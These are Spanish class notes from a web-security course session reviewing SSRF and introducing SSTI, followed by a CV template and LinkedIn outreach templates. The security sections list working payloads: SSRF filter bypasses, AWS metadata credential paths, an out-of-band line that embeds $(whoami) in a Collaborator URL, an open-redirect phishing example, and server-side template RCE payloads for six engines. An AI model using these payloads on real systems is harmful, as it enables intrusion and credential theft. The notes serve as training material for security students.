> [!info] Ficha tÃ©cnica
> **Instructor:** Carlos Castillo Â· **Fecha:** 24/07/2026
> **MÃ³dulo:** AuditorÃ­a web Â· Repaso Semanal III Â· SSRF + SSTI
> **Entorno:** Kali Linux Â· Burp Suite Â· PortSwigger Labs Â· Foxy Proxy
> **Participantes destacados:** Charchas, Mariana, Asier, Sira, Jon, Juan Carlos, Chema, Confil, Pablo, Oscar

> [!tip] CÃ³mo leer estos apuntes
> SesiÃ³n de **consolidaciÃ³n y cierre** del bloque SSRF antes de entrar en SSTI. Repaso estructurado de los 3 contextos canÃ³nicos, bypasses de blacklist/whitelist, blind SSRF con Collaborator, y caso real de phishing via Open Redirect. IntroducciÃ³n a SSTI (Jinja2/Twig/Freemarker) con payloads RCE. Cierra con logÃ­stica: horarios, septiembre Blue Team/AD, empleabilidad (CV + LinkedIn).

---

## â‘  Repaso SSRF â€” Los 3 Contextos CanÃ³nicos

### Resumen Integrado

| Contexto | Objetivo | TÃ©cnica Clave | Impacto |
|----------|----------|---------------|---------|
| **1. Localhost / Propio servidor** | Panel admin interno (`/admin`), endpoints privilegiados | `stockApi=http://localhost/admin` â†’ encadenar delete | Escalada a admin, borrado usuarios, acceso funcionalidad oculta |
| **2. Infraestructura Interna** | Servicios en red privada (`192.168.0.0/24`, puertos 8000-9000) | Intruder: fuzzing IPs â†’ fuzzing puertos â†’ panel sin auth | Pivote a red interna, servicios sin autenticaciÃ³n expuestos |
| **3. Cloud Metadata (AWS)** | Credenciales IAM temporales en `169.254.169.254` | NavegaciÃ³n Ã¡rbol: `/latest/meta-data/iam/security-credentials/<role>` | **Cloud Admin** â€” acceso S3, RDS, Lambda, EC2 con permisos del rol |

> [!important] La metÃ¡fora unificada
> **SSRF usa el servidor web de mensajero.** El atacante no puede llegar a `localhost`, `192.168.x.x`, ni `169.254.169.254`. Pero el servidor **sÃ­ puede**. Si controlas la URL que el servidor visita, el servidor hace el trabajo sucio por ti.

---

## â‘¡ Bypasses de Filtros â€” TaxonomÃ­a Completa

### A. Blacklist (Lista de Bloqueo) â€” El Servidor Bloquea Patrones Conocidos

| TÃ©cnica | Payload | Por QuÃ© Funciona |
|---------|---------|------------------|
| **IP Decimal** | `http://2130706433/` | `127.0.0.1` = 2130706433 en decimal. Parser IP lo acepta, regex bloquea solo string "127.0.0.1". |
| **IP Abreviada** | `http://127.1/` | `127.1` â‰¡ `127.0.0.1` (notaciÃ³n clase A). Muchos validadores no la contemplan. |
| **IP Octal** | `http://0177.0.0.1/` | NotaciÃ³n octal con leading zero. `0177` = 127 decimal. Backend parsea, frontend filtra string. |
| **IPv6 Loopback** | `http://[::1]/` | `::1` = localhost IPv6. Filtros solo miran IPv4. |
| **Dominio Propio (DNS Trick)** | `http://lvh.me/` â†’ `127.0.0.1`<br>`http://mi-dominio.com/` â†’ A record `127.0.0.1` | DNS resuelve a IP bloqueada. Servidor resuelve **en tiempo de request**, filtro valida **string estÃ¡tico**. |
| **Encoding 1x** | `http://127.0.0.1/%61dmin` | URL encoding simple. Validador decodifica 1 vez, ve "admin". Backend decodifica N veces. |
| **Encoding 2x (Doble)** | `http://127.0.0.1/%2561dmin` | `%25` = `%` codificado. Validador decodifica 1 vez â†’ `%61dmin` (no bloquea). Backend decodifica 2 veces â†’ `admin`. |
| **Encoding 3x (Triple)** | `http://127.0.0.1/%252561dmin` | Para backends que decodifican 3 veces (proxy â†’ WAF â†’ app). |

> [!note] Regla del Encoding
> **Validador decodifica 1 vez. Backend decodifica N veces.** Si N > 1, encoding (N-1)x bypassa el filtro. Siempre probar 1x, 2x, 3x.

### B. Open Redirect Chain â€” Encadenamiento con RedirecciÃ³n Abierta

```
ParÃ¡metro vulnerable (SSRF) â†’ URL de Open Redirect en misma app â†’ Redirige a destino interno
```

| Paso | Request | Response |
|------|---------|----------|
| 1. Detectar Open Redirect | `GET /redirect?url=https://evil.com` | `302 Location: https://evil.com` |
| 2. Encadenar SSRF | `stockApi=/redirect?url=http://localhost/admin` | Servidor sigue redirect â†’ llega a `/admin` interno |
| 3. Explotar | `stockApi=/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role` | Credenciales AWS |

> [!important] CondiciÃ³n necesaria
> El servidor **debe seguir redirecciones automÃ¡ticamente** (default en la mayorÃ­a de librerÃ­as HTTP: `requests`, `axios`, `fetch`, `HttpClient`). Si `follow_redirects=False`, no funciona.

### C. Whitelist (Lista Permitida) â€” El Servidor Solo Permite Dominios Conocidos

| TÃ©cnica | Payload | ExplicaciÃ³n |
|---------|---------|-------------|
| **UserInfo + @** | `http://allowed.com@127.0.0.1/` | RFC 3986: `userinfo@host`. Parser extrae host como `127.0.0.1`. Validador ve `allowed.com` en host. |
| **Fragment + @ (Doble Encoding)** | `http://allowed.com#@127.0.0.1/`<br>Codificado: `http://allowed.com%23%40127.0.0.1/` | `#` inicia fragmento (ignorado por servidor). `@` en fragmento confundido por algunos parsers como userinfo. Doble encoding evita WAF. |
| **Subdominio Controlado** | `http://allowed.com.evil.com/` | Validador comprueba `endsWith(".allowed.com")` o regex suelta. Atacante registra `allowed.com.evil.com`. |
| **Path Traversal en Host** | `http://allowed.com/../../127.0.0.1/` | Parsers raros que normalizan path en host. Poco comÃºn pero posible. |

> [!warning] Whitelist = MÃ¡s difÃ­cil, no imposible
> La clave es **entender QUÃ‰ parte de la URL valida el whitelist** (host, domain, suffix, regex) y **QUÃ‰ parte usa el backend para conectar** (host parsed). La discrepancia es la vulnerabilidad.

---

## â‘¢ SSRF Ciego (Blind SSRF) + Burp Collaborator

### QuÃ© es
> El servidor hace la peticiÃ³n **pero no refleja la respuesta** en el response HTTP al atacante. Timeout, 500, respuesta genÃ©rica, o respuesta vacÃ­a. La peticiÃ³n **sÃ­ se ejecuta en backend**.

### DetecciÃ³n: Burp Collaborator (o Interactsh / interact.sh)

```bash
# 1. Obtener URL Collaborator (Burp â†’ Collaborator client â†’ Copy to clipboard)
# Ejemplo: xyz123.collaborator.net

# 2. Inyectar en parÃ¡metro vulnerable
stockApi=http://xyz123.collaborator.net

# 3. Si hay SSRF ciego â†’ Collaborator registra:
# - DNS lookup (A/AAAA)
# - HTTP request (GET/POST)
# - SMTP/other si aplica
```

### InteracciÃ³n en Burp
```
Collaborator window:
[+] DNS: A query for xyz123.collaborator.net from 10.0.0.5 (target IP)
[+] HTTP: GET / from 10.0.0.5
 Headers: User-Agent: python-requests/2.31, Host: xyz123.collaborator.net
```

> [!tip] Collaborator vs Interactsh
> - **Burp Collaborator**: Integrado en Burp Pro, UI cÃ³moda, polling automÃ¡tico.
> - **Interactsh (projectdiscovery)**: Open source, CLI, self-hosted, gratis. `interactsh-client -server interactsh.projectdiscovery.io`

### ExplotaciÃ³n Ciega (Avanzada)
> Se verÃ¡ en sesiones avanzadas. Requiere:
> 1. **Out-of-band data exfiltration**: `stockApi=http://$(whoami).xyz123.collaborator.net` (command injection en URL)
> 2. **Encadenamiento**: SSRF ciego â†’ RCE en servicio interno â†’ reverse shell
> 3. **Time-based**: `stockApi=http://localhost:8080/delay/10` â†’ medir latencia respuesta

---

## â‘£ SSRF en Phishing â€” Abuso de Open Redirect (Caso Repsol)

### Vector Real
> Email phishing con enlace legÃ­timo de Repsol que redirige a pÃ¡gina de credenciales clonada.

```
Email: "Factura Repsol - Revise su consumo"
Enlace: https://www.repsol.com/redirect?url=https://phishing-repsol.evil.com/login
```

### Por QuÃ© Funciona
| Factor | ExplicaciÃ³n |
|--------|-------------|
| **Dominio legÃ­timo** | `repsol.com` pasa filtros antispam, reputaciÃ³n, DMARC/SPF/DKIM vÃ¡lidos |
| **Hover muestra dominio real** | Usuario pasa ratÃ³n â†’ ve `repsol.com/redirect?url=...` â†’ confÃ­a |
| **RedirecciÃ³n automÃ¡tica** | Navegador sigue 302 â†’ aterriza en `phishing-repsol.evil.com` |
| **PÃ¡gina clonada** | CSS/JS/imÃ¡genes copiadas de Repsol real â†’ indistinguible visualmente |
| **Credenciales robadas** | Usuario introduce user/pass â†’ enviadas a servidor atacante â†’ redirige a Repsol real |

### MitigaciÃ³n (Lado Defensor)
```
1. Validar URL de redirect contra whitelist ESTRICTA (dominios exactos, no sufijos)
2. PÃ¡gina intermedia de confirmaciÃ³n: "Va a salir de repsol.com. Â¿Continuar?"
3. Header Referrer-Policy: strict-origin-when-cross-origin
4. Educar usuarios: NUNCA introducir credenciales tras click en email
5. Monitorear Open Redirects en bug bounty / pentest interno
```

---

## â‘¤ IntroducciÃ³n a SSTI (Server-Side Template Injection)

### QuÃ© es
> InyecciÃ³n en motor de plantillas (template engine) que el servidor usa para renderizar HTML/emails/PDFs. Si el input del usuario llega al template **sin sanitizar**, puede ejecutar cÃ³digo en el servidor.

### Motores Comunes + DetecciÃ³n + RCE

| Motor | Sintaxis BÃ¡sica | Test DetecciÃ³n | Payload RCE |
|-------|-----------------|----------------|-------------|
| **Jinja2** (Python/Flask/Django) | `{{ 7*7 }}` â†’ `49`<br>`{{ config }}` â†’ objetos internos | `{{ 7*'7' }}` â†’ `7777777` (string concat) | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
| **Twig** (PHP/Symfony) | `{{ 7*7 }}` â†’ `49`<br>`{{ _self }}` â†’ objeto template | `{{ 7*'7' }}` â†’ `49` (numÃ©rico) | `{{ ['id']|filter('system') }}` o `{{ _self.env.registerUndefinedFilterCallback('system') }}` |
| **Freemarker** (Java) | `${7*7}` â†’ `49`<br>`${.globals}` | `${7*'7'}` â†’ error (tipado fuerte) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Velocity** (Java) | `#set($x=7*7)${x}` | `#set($x="7"*7)${x}` | `#set($rt=$class.forName("java.lang.Runtime"))#set($proc=$rt.getRuntime().exec("id"))` |
| **ERB** (Ruby/Rails) | `<%= 7*7 %>` â†’ `49` | `<%= "7"*7 %>` â†’ `7777777` | `<%= \`id\` %>` o `<%= system("id") %>` |
| **Smarty** (PHP) | `{$x=7*7}{$x}` | `{"7"|repeat:7}` | `{system("id")}` o `{php}system("id");{/php}` |

### MetodologÃ­a DetecciÃ³n Universal

```
1. Identificar parÃ¡metro que se refleja en respuesta (buscar en Burp: query, body, headers)
2. Inyectar payload matemÃ¡tico simple: {{7*7}}, ${7*7}, <%=7*7%>, {7*7}
3. Si response contiene "49" â†’ SSTI confirmado
4. Identificar motor: probar sintaxis especÃ­fica (config, _self, .globals, .version)
5. Escalar a RCE: payload especÃ­fico del motor + comando (id, whoami, cat /etc/passwd)
6. Post-explotaciÃ³n: reverse shell, enumeraciÃ³n, pivote
```

> [!warning] SSTI = RCE en la mayorÃ­a de casos
> A diferencia de XSS (lado cliente), SSTI ejecuta en **servidor**. Impacto: compromiso total del host, acceso a BD, secrets, red interna, pivote.

---

## â‘¥ LogÃ­stica â€” Horarios, Septiembre, Empleabilidad

### Horarios PrÃ³xima Semana

| DÃ­a | Horario | Tema |
|-----|---------|------|
| **Lunes** | 18:00 (6pm) | ByCode/DevOps â€” Despliegue real, GitHub Actions, servidores |
| **Martes** | 18:00 (6pm) | ByCode/DevOps â€” Arquitectura segura, Claude Code en infra propia |
| **MiÃ©rcoles** | 16:00 (4pm) | SQL Injection â€” BÃ¡sico â†’ UNION â†’ Blind â†’ Time-based â†’ OOB |

### Septiembre â€” Blue Team con Edu

| MÃ³dulo | Enfoque |
|--------|---------|
| **Active Directory** | EnumeraciÃ³n, Kerberos, DelegaciÃ³n, GPO, BloodHound, AD CS, Kerberoasting, AS-REP Roasting, DACL abuse |
| **Blue Team** | DetecciÃ³n (Sigma, Splunk/Elastic), Hardening, Tiered Admin, LAPS, Protected Users, Monitoring |
| **PrÃ¡ctica** | Laboratorio AD real (GOAD / BadBlood / entorno propio) â€” Ataque + Defensa integrados |

---

## â‘¦ PrÃ¡ctica 1 â€” CV para Equipo Empleabilidad (Raquel / Paula)

### Objetivo
> CV tÃ©cnico **optimizado para ciberseguridad** que pase filtro RRHH (30 seg) y filtro tÃ©cnico (lectura profunda).

### Estructura Requerida

```markdown
# NOMBRE APELLIDOS
ðŸ“ UbicaciÃ³n | ðŸ“§ email | ðŸ“± telÃ©fono | ðŸ”— LinkedIn | ðŸ™ GitHub | ðŸŒ Portfolio/Blog

## RESUMEN PROFESIONAL (3-4 lÃ­neas)
"Analista de seguridad ofensivo con X aÃ±os en pentesting web/red/cloud.
Especializado en [top 3 skills]. Certificaciones: [top 3]. 
Busco rol de [Penetration Tester / Security Engineer / Red Teamer]."

## HABILIDADES TÃ‰CNICAS (Agrupadas, ordenadas por relevancia)
**Ofensivo:** Burp Suite, OWASP Top 10, SQLi/SSRF/SSTI/XXE, AD Enum, C2 (Cobalt/Sliver), PrivEsc
**Defensivo:** SIEM (Splunk/Elastic), Sigma, YARA, Hardening Linux/Windows, Incident Response
**Cloud:** AWS/Azure/GCP pentest, Kubernetes security, Terraform, CI/CD security
**Coding:** Python (automatizaciÃ³n, exploit dev), Go (herramientas), Bash, PowerShell
**Certs:** OSCP, OSWE, CRTO, eCPPT, CEH, AWS Security Specialty (ordenar por prestigio)

â†’

## EXPERIENCIA (Reverse chronological)
**Empresa / Rol** | Mes/AÃ±o â€“ Mes/AÃ±o
- Logro cuantificado: "DescubrÃ­ y explotÃ© SSRF en app crÃ­tica â†’ acceso metadata AWS â†’ reporte + fix en 48h"
- Logro cuantificado: "Automatice reconocimiento con Python/Go â†’ reduje tiempo enum 70% (2h â†’ 30min)"
- Proyecto destacado: "LiderÃ© red team exercise contra AD 500+ usuarios â†’ Domain Admin en 4h"

## PROYECTOS DESTACADOS (3-5 max, links a GitHub)
- **ToolName** â€” DescripciÃ³n 1 lÃ­nea + tech stack + â­ stars / ðŸ´ forks
- **Writeup/Research** â€” TÃ­tulo + link + conferencia/blog donde publicado

## FORMACIÃ“N + CERTIFICACIONES
- MÃ¡ster Ciberseguridad [Centro] â€” AÃ±o
- OSCP (Offensive Security Certified Professional) â€” AÃ±o
- ...

## IDIOMAS
EspaÃ±ol (Nativo), InglÃ©s (B2/C1 - tÃ©cnico fluido), ...
```

### Checklist CV (Raquel / Paula revisan)
```
[ ] Una pÃ¡gina mÃ¡x (junior), dos pÃ¡ginas (senior)
[ ] Sin foto, sin datos personales innecesarios (edad, DNI, estado civil)
[ ] Verbos de acciÃ³n: DescubrÃ­, ExplotÃ©, Automatice, LiderÃ©, Reduje, ImplementÃ©
[ ] MÃ©tricas: %, tiempo, â‚¬, usuarios, servidores, vulnerabilidades crÃ­ticas
[ ] Keywords ATS: "OWASP", "Burp Suite", "SQL Injection", "Active Directory", "AWS", "Python", "SIEM"
[ ] GitHub con repos reales (no vacÃ­os), writeups, tools
[ ] LinkedIn sincronizado con CV
```

---

## â‘§ LinkedIn â€” Estrategia MensajerÃ­a Directa para Empleo

### Principio
> **No pidas trabajo. Ofrece valor. Genera conversaciÃ³n.**

### Plantillas Probadas

#### 1. ConexiÃ³n con Reclutador / Hiring Manager
```
Hola [Nombre],

Veo que buscÃ¡is [rol especÃ­fico] en [Empresa]. Lleva [X] aÃ±os en pentesting web/cloud,
con foco en [skill clave: ej. SSRF, AD, Cloud]. 

He publicado [tool/writeup/research] en GitHub: [link corto].

Â¿Os encaja perfiles con este perfil tÃ©cnico? Si es asÃ­, paso CV.

Un saludo,
[Tu Nombre]
```

#### 2. ConexiÃ³n con TÃ©cnico Senior / Team Lead (MÃ¡s efectivo)
```
Hola [Nombre],

SeguÃ­ tu charla/post sobre [tema tÃ©cnico especÃ­fico] y me pareciÃ³ brutal el enfoque de [detalle tÃ©cnico].

Yo estoy en [rol actual] y estoy profundizando en [tema relacionado]. 
Â¿Te importarÃ­a compartir quÃ© stack/herools usÃ¡is en [Empresa] para [problema tÃ©cnico]?

No busco trabajo ahora, solo aprender de referentes.

Gracias,
[Tu Nombre]
```

#### 3. Follow-up (Si responden)
```
Gracias por responder. 

Mi background: [2 lÃ­neas: certs + top skill + logro cuantificado].

Adjunto CV por si tenÃ©is hueco ahora o en Q4. 
Disponible para llamada tÃ©cnica 15min si querÃ©is validar fit.

[Link LinkedIn] | [Link GitHub] | [TelÃ©fono]
```

### MÃ©tricas Objetivo
| AcciÃ³n | Target Semanal |
|--------|----------------|
| Conexiones nuevas (reclutadores + tÃ©cnicos) | 20-30 |
| Respuestas a mensajes | >30% |
| Llamadas tÃ©cnicas / entrevistas | 2-4 |
| Ofertas formales | 1-2 / mes |

> [!tip] Clave: Perfil optimizado ANTES de mensajear
> - Headline: `Penetration Tester | OSCP | Web/Cloud/AD | Python/Go | Open Source: [tool]`
> - About: 3 pÃ¡rrafos: quiÃ©n eres, quÃ© haces (mÃ©tricas), quÃ© buscas
> - Featured: GitHub repo estrella + writeup + cert badge
> - Skills: 50+ endorsements en top 10 skills

---

## â‘¨ Frase Clave de la SesiÃ³n

> **"SSRF usa el servidor web de mensajero."**
> â€” Carlos Castillo

> **Significado:** El atacante no tiene acceso directo a recursos internos. Pero **controla la URL que el servidor visita**. El servidor, con sus privilegios de red, hace la peticiÃ³n **por** el atacante y (en SSRF no ciego) le **devuelve la respuesta**. Es un proxy involuntario.

---

## â‘© Checklist de Repaso â€” SSRF + SSTI + Empleabilidad

```
SSRF â€” 3 Contextos CanÃ³nicos
[ ] Explicar cada contexto: localhost, red interna, cloud metadata (AWS/GCP/Azure)
[ ] Payloads base: http://localhost/admin, http://169.254.169.254/latest/meta-data/
[ ] Intruder para fuzzing IP/puerto interno (resource pool 1 req/seg = OpSec)

SSRF â€” Bypasses
[ ] Blacklist: 127.1, decimal (2130706433), octal (0177.0.0.1), IPv6 (::1), DNS trick (lvh.me)
[ ] Encoding: 1x, 2x, 3x (validador 1x, backend Nx)
[ ] Open Redirect chain: SSRF param â†’ /redirect?url=interno
[ ] Whitelist: userinfo@host, fragment#@ double encoded, subdomain trick

SSRF â€” Ciego
[ ] Burp Collaborator / Interactsh para detecciÃ³n
[ ] DNS + HTTP interaction = confirmaciÃ³n
[ ] ExplotaciÃ³n avanzada: OOB exfil, time-based, chain â†’ RCE

SSTI â€” Intro
[ ] 6 motores: Jinja2, Twig, Freemarker, Velocity, ERB, Smarty
[ ] DetecciÃ³n universal: payload matemÃ¡tico ({{7*7}}, ${7*7}, <%=7*7%>)
[ ] IdentificaciÃ³n motor: config, _self, .globals, .version
[ ] RCE payload por motor (memorizar top 3: Jinja2, Twig, Freemarker)

LogÃ­stica
[ ] Lunes 18h / Martes 18h / MiÃ©rcoles 16h prÃ³xima semana
[ ] Septiembre: Blue Team + Active Directory con Edu
[ ] CV listo para Raquel/Paula (1 pÃ¡g, mÃ©tricas, keywords, GitHub)
[ ] LinkedIn: headline, about, featured, skills, estrategia mensajerÃ­a directa
```

---

> [!note] Notas de Clase
> - SesiÃ³n de **repaso y consolidaciÃ³n** impartida por **Carlos Castillo**. Cierre bloque SSRF antes de SSTI.
> - ParticipaciÃ³n: **Charchas, Mariana, Asier, Sira, Jon, Juan Carlos, Chema, Confil, Pablo, Oscar**.
> - Repaso estructurado: 3 contextos â†’ bypasses (blacklist/whitelist/redirect) â†’ blind SSRF + Collaborator â†’ caso real phishing Repsol (Open Redirect).
> - IntroducciÃ³n SSTI: 6 motores, detecciÃ³n universal, payloads RCE. Base para siguiente sesiÃ³n (SSTI profundo).
> - LogÃ­stica confirmada: horarios semana prÃ³xima, septiembre Blue Team/AD con Edu.
> - **Empleabilidad:** PrÃ¡ctica obligatoria CV para Raquel/Paula + estrategia LinkedIn direct messaging.
> - PrÃ³xima sesiÃ³n: **ByCode/DevOps (Lunes/Martes) + SQL Injection (MiÃ©rcoles)** â€” misma estructura progresiva que SSRF.

â†’

â†’

â†’

---

> [!tip] La lecciÃ³n mÃ¡s importante
> "No os memoriceis payloads. Entiende la LÃ“GICA. Â¿Por quÃ© funciona 127.1? Porque el parser IP lo permite. Â¿Por quÃ© doble encoding? Porque validador decodifica 1 vez, backend N veces. Si entiendes el PORQUÃ‰, inventas tus propios bypasses."
> â€” Carlos Castillo

â†’

â†’

â†’
â†’
